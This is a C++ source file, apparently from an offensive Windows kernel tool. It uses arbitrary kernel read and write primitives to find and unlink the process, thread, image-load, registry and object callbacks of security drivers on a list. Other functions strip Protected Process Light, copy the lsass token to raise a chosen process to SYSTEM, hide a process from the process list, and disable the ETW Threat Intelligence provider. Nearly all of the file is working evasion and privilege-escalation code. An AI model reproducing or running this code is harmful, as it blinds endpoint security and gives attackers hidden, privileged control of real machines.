#include "utils.h"



extern EZPDB pdb;
extern ULONG_PTR ntoskrnlBase;
extern const char* monitoredDrivers[];

EZPDB loadKernelOffsets() {
    std::string kernel = std::string(std::getenv("systemroot")) + "\\System32\\ntoskrnl.exe";
    std::string pdbPath = EzPdbDownload(kernel);

    if (pdbPath.empty())
    {
        std::cout << "download pdb failed " << GetLastError() << std::endl;;
    }

    EZPDB pdb;
    if (!EzPdbLoad(pdbPath, &pdb))
    {
        std::cout << "load pdb failed " << GetLastError() << std::endl;
    }


    return pdb;
}


ULONG_PTR GetKernelBaseAddress() {
	ULONG_PTR pKernelBaseAddress = 0;
	LPVOID* lpImageBase = NULL;
	DWORD dwBytesNeeded = 0;

	// first call calculates the exact size needed to read all the data
	if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
		return pKernelBaseAddress;
	}

	// allocate enough memory to read all data from EnumDeviceDrivers
	if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
		wprintf(L"[-] Couldn't allocate heap for lpImageBase.\n");
		if (lpImageBase)
			HeapFree(GetProcessHeap(), 0, lpImageBase);

		return pKernelBaseAddress;
	}

	if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
		if (lpImageBase)
			HeapFree(GetProcessHeap(), 0, lpImageBase);

		return pKernelBaseAddress;
	}

	// the first entry in the list is the kernel
	pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
	wprintf(L"[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

	return pKernelBaseAddress;
}

VOID SearchModule(ULONG64 Address, ModulesData* module) {
	ULONG_PTR pKernelBaseAddress = 0;
	LPVOID drivers[1024];
	DWORD dwBytesNeeded = 0;

	dwBytesNeeded = 1024 * 8;


	if (!EnumDeviceDrivers(drivers, dwBytesNeeded, &dwBytesNeeded)) {
		wprintf(L"[-] Couldn't EnumDeviceDrivers.\n");
		return;
	}
	int nDrivers = (int)(dwBytesNeeded / sizeof(drivers[0]));


	//printf("Num of loaded drivers: %d\n", nDrivers);
	LPVOID temp = NULL;

	CHAR driverName[MAX_PATH];
	//ricorda che array driver contiene i base address
	//for (size_t i = 0; i < nDrivers; i++) {
	//	if (GetDeviceDriverBaseNameA(drivers[i], driverName, sizeof(driverName)) {
	//		//check per primo byte, se inizia per 0xff e' un kernel addr probabilmente giusto per i kernel-mode drivers
	//		BYTE firstByte = (DWORD64)(drivers[i] >> 56);

	//		if (firstByte == 0xff) {
	// 
	// bubble sortiamo
	for (size_t j = 0; j < nDrivers; j++) {
		for (size_t m = j + 1; m < nDrivers; m++) {
			if (drivers[j] > drivers[m]) {
				temp = drivers[j];
				drivers[j] = drivers[m];
				drivers[m] = temp;

			}
		}
	}
	
	for (size_t i = 0; i < nDrivers-1; i++) {
		if ((ULONG64)drivers[i] <= Address && (ULONG64)drivers[i + 1] > Address) {
			if (GetDeviceDriverBaseNameA(drivers[i], driverName, sizeof(driverName))) {
				//printf("Found %s  at  %llx\n", driverName, drivers[i]);

				module->moduleBase = (ULONG64)drivers[i];
				strcpy(module->moduleName, driverName);
				return;
			}
			else {
				printf("GetDeviceDriverBaseNameA failed with error: [%u]\n", GetLastError());
			}
		}

	}

	return;
}

// Find PID of a process by its executable name
DWORD64 FindProcessId(const char* processName) {

	// Convert process name to wide char for comparison
	size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
	wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
	if (!wprocessName) {
		return 0;
	}
	mbstowcs(wprocessName, processName, wcharCount);

	DWORD64 processId = 0;

	// Take a snapshot of all running processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);

		// Iterate through all processes to find a match
		if (Process32First(snapshot, &processEntry)) {
			do {
				if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
					processId = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}

	free(wprocessName);
	return processId;
}

//		CALLBACK LIST FUNCTIONS

VOID ListProcCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 pspCreateProcessNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateProcessNotifyRoutine");

	DWORD64 address = (DWORD64)ntoskrnlBase + pspCreateProcessNotifyRoutineArray;

	printf("PspCreateProcessNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };
	
	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);
		
	}


}

VOID ListThreadCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspCreateThreadNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateThreadNotifyRoutine");

	DWORD64 address = (DWORD64)ntoskrnlBase + PspCreateThreadNotifyRoutineArray;

	printf("PspCreateThreadNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}


}

VOID ListLoadImageCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspLoadImageNotifyRoutineArray = EzPdbGetRva(&pdb, "PspLoadImageNotifyRoutine");

	DWORD64 address = (DWORD64)ntoskrnlBase + PspLoadImageNotifyRoutineArray;

	printf("PspLoadImageNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}

}

VOID ListRegCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 CallbackListHead = EzPdbGetRva(&pdb, "CallbackListHead");

	DWORD64 listHead = (DWORD64)ntoskrnlBase + CallbackListHead;

	printf("CallBackListHead at address: %llx\n", listHead);
	printf("Press any key to continue\n");
	getchar();
	ModulesData moduleInfo = { 0 };
	DWORD64 moduleFuncAddr;

	DWORD64 currListEntry = listHead;
	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;

	int i = 0;
	for (size_t i = 0; i < max_entries; i ++){
		// moduleFuncAddr = Read64(hDevice, curr)
		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;


		//printf("currListEntry: flink  0x%llx\n", castedEntry->Item.Flink);
		//printf("currListEntry: blink  0x%llx\n", castedEntry->Item.Blink);
		//printf("currListEntry: Context  0x%llx\n", castedEntry->Context);
		//printf("currListEntry: Function  0x%llx\n", castedEntry->Function);
		if (castedEntry->Function) {
			moduleFuncAddr = castedEntry->Function;
		}
		else if (castedEntry->Context) {
			moduleFuncAddr = castedEntry->Context;
		}
		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
		SearchModule(moduleFuncAddr, &moduleInfo);

		if (moduleInfo.moduleBase) {
			printf("Found reg callback by: %s\n", moduleInfo.moduleName);
		}

		currListEntry = (DWORD64)castedEntry->Item.Flink;
		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;


		if ((DWORD64)currListEntry == listHead) {
			break;
		}

	}
	free(entry);
}

VOID ListObjCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 procCallbackListHead = EzPdbGetRva(&pdb, "PsProcessType");
	DWORD64 threadCallbackListHead = EzPdbGetRva(&pdb, "PsThreadType");

	DWORD64 internalOffset = EzPdbGetStructPropertyOffset(&pdb, "_OBJECT_TYPE", L"CallbackList");


	DWORD64 procListHead = (DWORD64)ntoskrnlBase + procCallbackListHead;
	DWORD64 threadListHead = (DWORD64)ntoskrnlBase + threadCallbackListHead;


	procListHead = Read64(hDevice, procListHead);
	threadListHead = Read64(hDevice, threadListHead);

	procListHead += internalOffset;
	threadListHead += internalOffset;

	printf("procCallBackListHead at address: %llx\n", procListHead);
	printf("procCallBackListHead at address: %llx\n", threadListHead);

	printf("Press any key to continue\n");
	getchar();
	ModulesData moduleInfo = { 0 };
	DWORD64 moduleFuncAddr;

	DWORD64 currListEntry = procListHead;
	BYTE* entry = (BYTE*)malloc(sizeof(OB_CALLBACK_ENTRY));
	OB_CALLBACK_ENTRY* castedEntry = (OB_CALLBACK_ENTRY*)entry;

	int i = 0;
	for (size_t i = 0; i < max_entries; i++) {
		
		ReadN(hDevice, currListEntry, sizeof(OB_CALLBACK_ENTRY), entry);
		castedEntry = (OB_CALLBACK_ENTRY*)entry;


		//printf("currListEntry: flink  0x%llx\n", castedEntry->CallbackList.Flink);
		//printf("currListEntry: blink  0x%llx\n", castedEntry->CallbackList.Blink);
		//printf("currListEntry: PreOperation  0x%llx\n", castedEntry->PreOperation);
		//printf("currListEntry: PostOperation  0x%llx\n\n", castedEntry->PostOperation);
	
		if (castedEntry->PreOperation) {
			moduleFuncAddr = castedEntry->PreOperation;
		}
		else if (castedEntry->PostOperation) {
			moduleFuncAddr = castedEntry->PostOperation;
		}
		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
		SearchModule(moduleFuncAddr, &moduleInfo);

		if (moduleInfo.moduleBase) {
			printf("Found obj callback by: %s\n", moduleInfo.moduleName);
		}

		currListEntry = (DWORD64)castedEntry->CallbackList.Flink;
		castedEntry = (OB_CALLBACK_ENTRY*)castedEntry->CallbackList.Flink;


		if ((DWORD64)currListEntry == procListHead) {
			break;
		}

	}
	free(entry);
}

//		CALLBACK DELETING FUNCTIONS

VOID DeleteProcCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 pspCreateProcessNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateProcessNotifyRoutine");

	pspCreateProcessNotifyRoutineArray = (DWORD64)ntoskrnlBase + pspCreateProcessNotifyRoutineArray;

	DWORD64 address = pspCreateProcessNotifyRoutineArray;

	printf("pspCreateProcessNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		for (size_t j = 0; j < 104; j++) {
			if (_strcmpi((const char*)moduleInfo.moduleName,monitoredDrivers[j]) == 0) {
				printf("Deleting proc creation callback for: %s\n", moduleInfo.moduleName);
				DWORD64 callBackEntry = pspCreateProcessNotifyRoutineArray + i * 8;

				printf("callbackEntry address: %llx\n", callBackEntry);
				printf("To confirm press Any key\n");
				getchar();

				Write64(hDevice, callBackEntry, (DWORD64)0x0);
				

			}
		}

		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}

}

VOID DeleteThreadCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspCreateThreadNotifyRoutineArray = EzPdbGetRva(&pdb, "PspCreateThreadNotifyRoutine");

	PspCreateThreadNotifyRoutineArray = (DWORD64)ntoskrnlBase + PspCreateThreadNotifyRoutineArray;

	DWORD64 address = PspCreateThreadNotifyRoutineArray;

	printf("PspCreateThreadNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		for (size_t j = 0; j < 104; j++) {
			if (_strcmpi((const char*)moduleInfo.moduleName, monitoredDrivers[j]) == 0) {
				printf("Deleting thread creation callback for: %s\n", moduleInfo.moduleName);
				DWORD64 callBackEntry = PspCreateThreadNotifyRoutineArray + i * 8;

				printf("callbackEntry address: %llx\n", callBackEntry);
				printf("To confirm press Any key\n");
				getchar();

				Write64(hDevice, callBackEntry, (DWORD64)0x0);


			}
		}

		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}

}

VOID DeleteLoadImageCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 PspLoadImageNotifyRoutineArray = EzPdbGetRva(&pdb, "PspLoadImageNotifyRoutine");

	PspLoadImageNotifyRoutineArray = (DWORD64)ntoskrnlBase + PspLoadImageNotifyRoutineArray;

	DWORD64 address = PspLoadImageNotifyRoutineArray;

	printf("PspLoadImageNotifyRoutineArray address: %llx\n", address);
	ModulesData moduleInfo = { 0 };

	DWORD64 readPspAddr;
	for (size_t i = 0; i < max_entries; i++) {
		readPspAddr = Read64(hDevice, address);
		address += sizeof(ULONG_PTR);
		if (!readPspAddr) {
			continue;
		}
		readPspAddr = readPspAddr & 0xFFFFFFFFFFFFFFF8;
		readPspAddr = Read64(hDevice, readPspAddr);
		SearchModule(readPspAddr, &moduleInfo);
		//printf("process callback array[%d] : %llx\n", i, readPspAddr);
		if (!moduleInfo.moduleBase) {
			continue;
		}

		for (size_t j = 0; j < 104; j++) {
			if (_strcmpi((const char*)moduleInfo.moduleName, monitoredDrivers[j]) == 0) {
				printf("Deleting image loading creation callback for: %s\n", moduleInfo.moduleName);
				DWORD64 callBackEntry = PspLoadImageNotifyRoutineArray + i * 8;

				printf("callbackEntry address: %llx\n", callBackEntry);
				printf("To confirm press Any key\n");
				getchar();

				Write64(hDevice, callBackEntry, (DWORD64)0x0);


			}
		}

		//printf("[%d] ModuleBase: %llx, ModuleName: %s\n\n", i, moduleInfo.moduleBase, moduleInfo.moduleName);

	}
}

VOID DeleteRegCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 CallbackListHead = EzPdbGetRva(&pdb, "CallbackListHead");

	DWORD64 listHead = (DWORD64)ntoskrnlBase + CallbackListHead;

	printf("CallBackListHead at address: %llx\n", listHead);
	printf("Press any key to continue\n");
	getchar();
	ModulesData moduleInfo = { 0 };
	DWORD64 moduleFuncAddr;

	DWORD64 currListEntry = listHead;
	BYTE* entry = (BYTE*)malloc(sizeof(REGISTRY_CALLBACK_ITEM));
	REGISTRY_CALLBACK_ITEM* castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;

	int i = 0;
	for (size_t i = 0; i < max_entries; i++) {
		// moduleFuncAddr = Read64(hDevice, curr)
		ReadN(hDevice, currListEntry, sizeof(REGISTRY_CALLBACK_ITEM), entry);
		castedEntry = (REGISTRY_CALLBACK_ITEM*)entry;



		if (castedEntry->Function) {
			moduleFuncAddr = castedEntry->Function;
		}
		else if (castedEntry->Context) {
			moduleFuncAddr = castedEntry->Context;
		}
		SearchModule(moduleFuncAddr, &moduleInfo);

		if (moduleInfo.moduleBase) {
			for (size_t k = 0; k < 104; k++) {
				if (_strcmpi(moduleInfo.moduleName, monitoredDrivers[k]) == 0) {
					printf("Deleting reg callback entry for: %s\n", moduleInfo.moduleName);
					DWORD64 addr1 = (DWORD64)castedEntry->Item.Blink;
					DWORD64 addr2 = (DWORD64)castedEntry->Item.Flink + 0x8; // blink


					DWORD64 addrmio1 = currListEntry;
					DWORD64 addrmio2 = currListEntry + 0x8;
					
					// unlinko
					Write64(hDevice, addr1, (DWORD64)castedEntry->Item.Flink);
					Write64(hDevice, addr2, (DWORD64)castedEntry->Item.Blink);

					//sovrascrivo quelli nella mia struct
					Write64(hDevice, addrmio1, (DWORD64)currListEntry);
					Write64(hDevice, addrmio2, (DWORD64)currListEntry);
					
					
				}
			}
		}

		currListEntry = (DWORD64)castedEntry->Item.Flink;
		castedEntry = (REGISTRY_CALLBACK_ITEM*)castedEntry->Item.Flink;


		if ((DWORD64)currListEntry == listHead) {
			break;
		}

	}
	free(entry);
}

VOID DeleteObjCallback(HANDLE hDevice) {
	int max_entries = 64;
	DWORD64 procCallbackListHead = EzPdbGetRva(&pdb, "PsProcessType");
	DWORD64 threadCallbackListHead = EzPdbGetRva(&pdb, "PsThreadType");

	DWORD64 internalOffset = EzPdbGetStructPropertyOffset(&pdb, "_OBJECT_TYPE", L"CallbackList");


	DWORD64 procListHead = (DWORD64)ntoskrnlBase + procCallbackListHead;
	DWORD64 threadListHead = (DWORD64)ntoskrnlBase + threadCallbackListHead;


	procListHead = Read64(hDevice, procListHead);
	threadListHead = Read64(hDevice, threadListHead);

	procListHead += internalOffset;
	threadListHead += internalOffset;

	printf("procCallBackListHead at address: %llx\n", procListHead);
	printf("procCallBackListHead at address: %llx\n", threadListHead);

	printf("Press any key to continue\n");
	getchar();
	ModulesData moduleInfo = { 0 };
	DWORD64 moduleFuncAddr;

	DWORD64 currListEntry = procListHead;
	BYTE* entry = (BYTE*)malloc(sizeof(OB_CALLBACK_ENTRY));
	OB_CALLBACK_ENTRY* castedEntry = (OB_CALLBACK_ENTRY*)entry;

	int i = 0;
	for (size_t i = 0; i < max_entries; i++) {

		ReadN(hDevice, currListEntry, sizeof(OB_CALLBACK_ENTRY), entry);
		castedEntry = (OB_CALLBACK_ENTRY*)entry;


		//printf("currListEntry: flink  0x%llx\n", castedEntry->CallbackList.Flink);
		//printf("currListEntry: blink  0x%llx\n", castedEntry->CallbackList.Blink);
		//printf("currListEntry: PreOperation  0x%llx\n", castedEntry->PreOperation);
		//printf("currListEntry: PostOperation  0x%llx\n\n", castedEntry->PostOperation);

		if (castedEntry->PreOperation) {
			moduleFuncAddr = castedEntry->PreOperation;
		}
		else if (castedEntry->PostOperation) {
			moduleFuncAddr = castedEntry->PostOperation;
		}
		printf("Searching callback for addr: %llx\n", moduleFuncAddr);
		SearchModule(moduleFuncAddr, &moduleInfo);

		if (moduleInfo.moduleBase) {
			printf("Found obj callback by: %s\n", moduleInfo.moduleName);
			for (size_t k = 0; k < 104; k++) {
				if (_strcmpi(moduleInfo.moduleName, monitoredDrivers[k]) == 0) {
					printf("Deleting reg callback entry for: %s\n", moduleInfo.moduleName);
					DWORD64 addr1 = (DWORD64)castedEntry->CallbackList.Blink;
					DWORD64 addr2 = (DWORD64)castedEntry->CallbackList.Flink + 0x8; // blink


					DWORD64 addrmio1 = currListEntry;
					DWORD64 addrmio2 = currListEntry + 0x8;

					// unlinko
					Write64(hDevice, addr1, (DWORD64)castedEntry->CallbackList.Flink);
					Write64(hDevice, addr2, (DWORD64)castedEntry->CallbackList.Blink);

					//sovrascrivo quelli nella mia struct
					Write64(hDevice, addrmio1, (DWORD64)currListEntry);
					Write64(hDevice, addrmio2, (DWORD64)currListEntry);


				}
			}
		}

		currListEntry = (DWORD64)castedEntry->CallbackList.Flink;
		castedEntry = (OB_CALLBACK_ENTRY*)castedEntry->CallbackList.Flink;


		if ((DWORD64)currListEntry == procListHead) {
			break;
		}

	}
	free(entry);
}

//		VARIOUS

VOID BypassPpl(HANDLE hDevice, DWORD64 pid) {
	int max_retries = 99999;

	DWORD64 PsInitialSystemProcess = EzPdbGetRva(&pdb, "PsInitialSystemProcess");

	DWORD64 pidOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");  // VOID *, HANDLE
	DWORD64 protectionOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Protection"); // 1 byte
	DWORD64 activeProcessLinksOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks"); // _LIST_ENTRY

	PsInitialSystemProcess += ntoskrnlBase;
	printf("PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);

	// PsInitialSystemProcess is a pointer so we need to read
	DWORD64 currPtr = Read64(hDevice,PsInitialSystemProcess);

	while (1) {
		DWORD64 currPid = Read64(hDevice, currPtr + pidOffset);

		if (currPid == pid) {
			printf("Process found:\n");
			break;
		}

		// this is basically 
		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);

		if (!flink) {
			printf("Flink reading failed. it is 0\n");
			break;
		}
		currPtr = flink - activeProcessLinksOffset;

		if (currPtr == PsInitialSystemProcess) {
			printf("All processes iterated, not found\n");
			return;
		}
	}
	if (currPtr) {
		Write64(hDevice, currPtr + protectionOffset, (DWORD64)0x0);
		printf("Disabled protection for the process\n");
	}
}

VOID elevateProc(HANDLE hDevice, DWORD64 pid) {
	int max_retries = 99999;

	DWORD64 lsassPid = FindProcessId("lsass.exe");

	DWORD64 PsInitialSystemProcess = EzPdbGetRva(&pdb, "PsInitialSystemProcess");

	DWORD64 pidOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");  // VOID *, HANDLE
	DWORD64 tokenOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Token"); // 8 byte
	DWORD64 activeProcessLinksOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks"); // _LIST_ENTRY

	PsInitialSystemProcess += ntoskrnlBase;
	printf("PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);

	// PsInitialSystemProcess is a pointer so we need to read
	DWORD64 currPtr = Read64(hDevice, PsInitialSystemProcess);

	DWORD64 lsassToken = 0;

	DWORD64 ourTokenAddr = 0;

	while (1) {
		DWORD64 currPid = Read64(hDevice, currPtr + pidOffset);

		if (currPid == lsassPid) {
			printf("Stealking token from lsass\n");
			lsassToken = Read64(hDevice, currPtr + tokenOffset);
		}

		if (currPid == pid) {
			ourTokenAddr = currPtr + tokenOffset;
		}

		if (lsassToken && ourTokenAddr) {
			break;
		}
		// this is basically 
		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);

		if (!flink) {
			printf("Flink reading failed. it is 0\n");
			break;
		}
		currPtr = flink - activeProcessLinksOffset;

		if (currPtr == PsInitialSystemProcess) {
			printf("All processes iterated, not found\n");
			return;
		}
	}
	if (lsassToken && ourTokenAddr) {
		printf("Elevating process: %d\n", pid);
		Write64(hDevice, ourTokenAddr, lsassToken);
	}
}

VOID hideProc(HANDLE hDevice, DWORD64 pid) {
	int max_retries = 99999;

	DWORD64 PsInitialSystemProcess = EzPdbGetRva(&pdb, "PsInitialSystemProcess");

	DWORD64 pidOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");  // VOID *, HANDLE
	DWORD64 tokenOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Token"); // 8 byte
	DWORD64 activeProcessLinksOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks"); // _LIST_ENTRY

	PsInitialSystemProcess += ntoskrnlBase;
	printf("PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);

	// PsInitialSystemProcess is a pointer so we need to read
	DWORD64 currPtr = Read64(hDevice, PsInitialSystemProcess);



	while (1) {
		DWORD64 currPid = Read64(hDevice, currPtr + pidOffset);

		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);
		DWORD64 blink = Read64(hDevice, currPtr + activeProcessLinksOffset + 0x8);

		if (currPid == pid) {
			printf("Unlinking proc %d\n", pid);
			// scrivo il flink del blink
			Write64(hDevice, blink, flink);
			// scrivio il blink del flink
			Write64(hDevice, flink + 0x8, blink);

			// faccio puntare a me stesso i blink e flink
			Write64(hDevice, currPtr + activeProcessLinksOffset, currPtr + activeProcessLinksOffset);
			Write64(hDevice, currPtr + activeProcessLinksOffset + 0x8, currPtr + activeProcessLinksOffset);
			break;
		}


		if (!flink) {
			printf("Flink reading failed. it is 0\n");
			break;
		}
		currPtr = flink - activeProcessLinksOffset;

		if (currPtr == PsInitialSystemProcess) {
			printf("All processes iterated, not found\n");
			return;
		}
	}
}

VOID disableWTI(HANDLE hDevice) {
	DWORD64 etWThreatIntProvRegHandleoff = EzPdbGetRva(&pdb, "EtwThreatIntProvRegHandle");

	DWORD64 regEntry_guidEntry = EzPdbGetStructPropertyOffset(&pdb, "_ETW_REG_ENTRY", L"GuidEntry");

	DWORD64 GuidEntry_ProviderEnableInfo = EzPdbGetStructPropertyOffset(&pdb, "_ETW_GUID_ENTRY", L"ProviderEnableInfo");




	DWORD64 etwtiProvReghandle = ntoskrnlBase + etWThreatIntProvRegHandleoff;

	DWORD64 ETWTI_ETW_REG_ENTRY = Read64(hDevice, etwtiProvReghandle) + regEntry_guidEntry;

	DWORD64 providerEnableInfoAddress = Read64(hDevice, ETWTI_ETW_REG_ENTRY) + GuidEntry_ProviderEnableInfo;

	printf("[+] ETWTI ProviderEnableInfo address = 0x%llx\n", providerEnableInfoAddress);


	printf("[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", (Read64(hDevice,providerEnableInfoAddress) & 0xFF));

	printf("[+] Disabling ETWTI Provider:\n");
	Write64(hDevice, providerEnableInfoAddress, (DWORD64)0x0);

	printf("[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", (Read64(hDevice, providerEnableInfoAddress) & 0xFF));

}

VOID terminateProcess(HANDLE hDevice, DWORD pid) {
	terminatePrimitive(hDevice, pid);
}